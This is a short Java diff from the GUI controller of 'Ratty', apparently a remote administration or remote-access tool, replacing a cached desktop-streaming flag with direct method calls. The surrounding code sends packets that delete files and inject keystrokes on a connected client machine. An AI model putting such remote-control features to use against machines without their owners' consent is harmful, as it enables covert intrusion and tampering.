@@ -72,8 +72,6 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 	}
 	
 	private IPacket getPacket(final String command, final ServerClient serverClient) {
-		final boolean streamingDesktop = serverClient.isStreamingDesktop();
-		
 		IPacket packet = null;
 		
 		if (command == RattyGui.POPUP) {
@@ -130,12 +128,12 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 			packet = new DeleteFilePacket(path);
 			
 			treePanel.removeFile(path);
-		} else if (command == DisplayPanel.KEY_PRESSED && streamingDesktop) {
+		} else if (command == DisplayPanel.KEY_PRESSED && serverClient.isStreamingDesktop()) {
 			final DisplayPanel displayPanel = serverClient.getDisplayPanel();
 			final int key = displayPanel.getLastKeyHit();
 			
 			packet = new KeyEventPacket(key, KeyEventPacket.PRESS);
-		} else if (command == DisplayPanel.KEY_RELEASED && streamingDesktop) {
+		} else if (command == DisplayPanel.KEY_RELEASED && serverClient.isStreamingDesktop()) {
 			final DisplayPanel displayPanel = serverClient.getDisplayPanel();
 			final int key = displayPanel.getLastKeyHit();
 			
